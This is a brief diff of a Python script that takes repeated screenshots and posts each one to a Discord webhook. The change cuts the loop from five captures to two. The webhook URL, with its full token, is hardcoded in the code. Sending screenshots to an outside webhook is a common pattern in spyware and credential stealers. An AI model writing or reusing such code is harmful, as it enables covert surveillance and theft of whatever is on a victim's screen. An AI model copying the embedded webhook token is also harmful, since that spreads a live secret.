@@ -18,7 +18,7 @@ if __name__ == "__main__":
     webhook_url = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'
 
     screenshot_paths = []
-    for i in range(5):
+    for i in range(2):
         screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
         screenshot_paths.append(screenshot_path)
         send_to_discord_webhook(webhook_url, screenshot_path)
